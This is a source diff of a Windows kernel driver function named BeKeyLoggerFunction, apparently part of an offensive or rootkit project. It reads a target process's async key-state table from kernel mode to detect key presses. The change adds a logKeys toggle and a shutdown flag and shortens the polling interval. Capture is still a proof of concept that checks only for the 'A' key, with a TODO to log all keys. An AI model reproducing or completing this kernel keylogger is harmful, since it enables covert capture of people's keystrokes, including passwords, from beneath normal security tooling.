@@ -148,23 +148,29 @@ BeKeyLoggerFunction(IN PVOID StartContext)
 
 	PVOID gasAsyncKeyStateAddr = BeGetGafAsyncKeyStateAddress(targetProc);
 
-	while (BeGlobals::runKeyLogger)
+	while(true)
 	{
-		BeUpdateKeyStateMap(procId, gasAsyncKeyStateAddr);
-
-		// POC: just check for A. TODO: log all keys
-		if (BeWasKeyPressed(0x41))
+		if (BeGlobals::logKeys)
 		{
-			LOG_MSG("A pressed\n");
+			BeUpdateKeyStateMap(procId, gasAsyncKeyStateAddr);
+
+			// POC: just check for A. TODO: log all keys
+			if (BeWasKeyPressed(0x41))
+			{
+				LOG_MSG("A pressed\n");
+			}
+		}
+		
+		if (BeGlobals::shutdown)
+		{
+			ObDereferenceObject(targetProc);
+			PsTerminateSystemThread(STATUS_SUCCESS);
 		}
 
-		// Sleep for 0.1 seconds
+		// Sleep for 0.05 seconds
 		LARGE_INTEGER interval;
-		interval.QuadPart = -1 * (LONGLONG)100 * 10000; 
+		interval.QuadPart = -1 * (LONGLONG)50 * 10000;
 		KeDelayExecutionThread(KernelMode, FALSE, &interval);
 	}
-
-	ObDereferenceObject(targetProc);
-	PsTerminateSystemThread(STATUS_SUCCESS);
 }
  
